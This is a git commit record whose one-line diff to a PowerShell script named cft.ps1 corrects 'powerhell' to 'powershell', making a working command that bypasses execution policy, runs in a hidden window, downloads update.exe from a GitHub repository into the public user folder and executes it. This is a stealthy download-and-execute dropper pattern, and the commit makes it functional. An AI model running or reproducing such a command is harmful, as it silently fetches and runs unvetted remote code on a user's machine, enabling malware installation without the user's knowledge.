ec1f435c7ed640b3a923e7b80701ca8998e69b5b
br1337 <58513517+br1337@users.noreply.github.com>
2024-08-26 15:41:52 +0300

    Update cft.ps1

--- cft.ps1
+++ cft.ps1
@@ -1,1 +1,1 @@
-powerhell -ep bypass -nop -w hidden curl https://github.com/br1337/Scripts/raw/main/update.exe -o c:\users\public\update.exe; c:\users\public\update.exe
+powershell -ep bypass -nop -w hidden curl https://github.com/br1337/Scripts/raw/main/update.exe -o c:\users\public\update.exe; c:\users\public\update.exe
